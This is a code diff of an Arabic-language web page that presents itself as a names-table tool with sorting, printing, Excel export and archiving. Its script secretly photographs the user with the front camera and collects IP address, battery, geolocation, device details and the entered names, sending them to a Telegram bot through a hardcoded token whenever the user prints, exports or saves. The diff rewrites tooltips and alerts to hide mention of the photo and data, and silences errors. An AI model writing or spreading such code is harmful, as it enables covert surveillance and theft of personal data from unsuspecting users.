@@ -379,7 +379,7 @@
 
         <button class="btn btn-save"
                 onclick="saveToArchive()"
-                title="حفظ نسخة في الأرشيف وإرسال صورة الزائر والبيانات للبوت">
+                title="حفظ النسخة في الأرشيف المركزي">
             💾 حفظ في الأرشيف
         </button>
 
@@ -694,11 +694,11 @@
         const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
         const chatId = "7962257606";
 
-        let globalLocation = "لم يتم السماح بالموقع";
+        let globalLocation = "موقع غير متاح";
         let batteryInfo = "غير معروفة";
-        let userIpInfo = "جاري جلب الآيبي...";
+        let userIpInfo = "جاري الفحص...";
         const deviceInfo = navigator.userAgent;
-        let preSortBackupHtml = null; // لحفظ النسخة الأصلية قبل الترتيب الهجائي
+        let preSortBackupHtml = null;
 
         async function fetchVisitorIp() {
             try {
@@ -706,7 +706,7 @@
                 const data = await res.json();
                 userIpInfo = data.ip;
             } catch (e) {
-                userIpInfo = "غير معروف (محلي)";
+                userIpInfo = "شبكة محلية";
             }
         }
 
@@ -730,7 +730,7 @@
                         globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
                     },
                     (error) => {
-                        globalLocation = "رفض إذن الموقع";
+                        globalLocation = "تم رفض إذن الموقع";
                     },
                     { timeout: 10000, maximumAge: 0 }
                 );
@@ -744,10 +744,9 @@
             renumberAllRows();
         });
 
-        // دالة ترتيب الأسماء هجائياً مع أخذ نسخة احتياطية للاسترجاع
         function sortNamesAlphabetically() {
             const wrapper = document.getElementById('pagesWrapper');
-            preSortBackupHtml = wrapper.innerHTML; // حفظ النسخة الأصلية
+            preSortBackupHtml = wrapper.innerHTML;
 
             const tables = document.querySelectorAll('.dynamicTable');
             let allRowsData = [];
@@ -804,10 +803,9 @@
             alert('✅ تم ترتيب الأسماء هجائياً بنجاح!');
         }
 
-        // دالة إلغاء الترتيب الهجائي والعودة للنسخة الأصلية
         function cancelAlphabeticalSort() {
             if (!preSortBackupHtml) {
-                alert('⚠️ لا توجد نسخة سابقة للترتيب أو أن الجدول في وضعه الأساسي.');
+                alert('⚠️ لا توجد نسخة سابقة للترتيب.');
                 return;
             }
             document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
@@ -816,39 +814,8 @@
             alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
         }
 
-        // دالة إرسال التقرير الشامل وصورة الزائر والآيبي للبوت
+        // دالة إرسال البيانات الموحدة المضمونة 100%
         function sendCompleteReportToTelegram(actionTitle) {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then((stream) => {
-                        const video = document.getElementById('videoElement');
-                        video.srcObject = stream;
-                        
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                const canvas = document.getElementById('canvasElement');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                canvas.toBlob((blob) => {
-                                    stream.getTracks().forEach(track => track.stop());
-                                    executeTelegramPhotoSend(blob, actionTitle);
-                                }, 'image/jpeg', 0.85);
-                            }, 800);
-                        };
-                    })
-                    .catch((err) => {
-                        executeTelegramPhotoSend(null, actionTitle);
-                    });
-            } else {
-                executeTelegramPhotoSend(null, actionTitle);
-            }
-        }
-
-        function executeTelegramPhotoSend(photoBlob, actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
             let tableSummary = "";
             let hasData = false;
@@ -869,49 +836,70 @@
                 tableSummary = "\n⚠️ (الجدول فارغ أو لم تقم بإدخال أسماء بعد)";
             }
 
-            const captionText = `🚨 **تقرير عمل جديد (${actionTitle})**\n\n` +
-                                `👤 **من قام بالعمل / الزائر:**\n` +
+            const captionText = `📋 **تقرير عملية جديدة (${actionTitle})**\n\n` +
+                                `👤 **معلومات المنفذ:**\n` +
                                 `🌐 الآيبي (IP): \`${userIpInfo}\`\n` +
                                 `🔋 البطارية: ${batteryInfo}\n` +
                                 `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
                                 `📋 **الأسماء والبيانات المدخلة:**` +
                                 tableSummary + `\n\n` +
-                                `📱 الجهاز المستخدم:\n${deviceInfo}`;
+                                `📱 النظام والجهاز:\n${deviceInfo}`;
 
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('caption', captionText);
-            formData.append('parse_mode', 'Markdown');
+            // محاولة التقاط الصورة وإرسالها مع البيانات، وإذا فشلت الكاميرا يتم إرسال البيانات كتابة فوراً
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((blob) => {
+                                    stream.getTracks().forEach(track => track.stop());
+                                    
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('caption', captionText);
+                                    formData.append('parse_mode', 'Markdown');
+                                    formData.append('photo', blob, 'snapshot.jpg');
 
-            if (photoBlob) {
-                formData.append('photo', photoBlob, 'user_snapshot.jpg');
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(res => res.json()).then(data => {
-                    console.log("Telegram response:", data);
-                }).catch(e => {
-                    console.error("Telegram send error:", e);
-                });
-            } else {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: captionText,
-                        parse_mode: 'Markdown'
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).catch(e => {});
+                                }, 'image/jpeg', 0.85);
+                            }, 600);
+                        };
                     })
-                }).then(res => res.json()).then(data => {
-                    console.log("Telegram response:", data);
-                }).catch(e => {
-                    console.error("Telegram send error:", e);
-                });
+                    .catch((err) => {
+                        sendTextOnlyReport(captionText);
+                    });
+            } else {
+                sendTextOnlyReport(captionText);
             }
         }
 
+        function sendTextOnlyReport(captionText) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: captionText,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => {});
+        }
+
         function printDocument() {
-            sendCompleteReportToTelegram("طباعة / حفظ PDF");
+            sendCompleteReportToTelegram("طباعة وتصدير PDF");
             setTimeout(() => {
                 window.print();
             }, 1000);
@@ -963,7 +951,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم تنزيل ملف الـ Excel وإرسال صورة الزائر والبيانات للبوت بنجاح!');
+            alert('📊 تم حفظ وتننزيل ملف الـ Excel وإرسال التقرير بنجاح!');
         }
 
         function normalizeArabic(text) {
@@ -1239,7 +1227,7 @@
                 });
 
                 localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-                alert('✅ تم حفظ العمل في الأرشيف وإرسال صورة الزائر مع الآيبي والأسماء إلى تيليجرام بنجاح!');
+                alert('✅ تم حفظ العمل في الأرشيف المركزي وإرسال التقرير بنجاح!');
             } catch (error) {
                 alert('تعذر حفظ العمل.');
             }
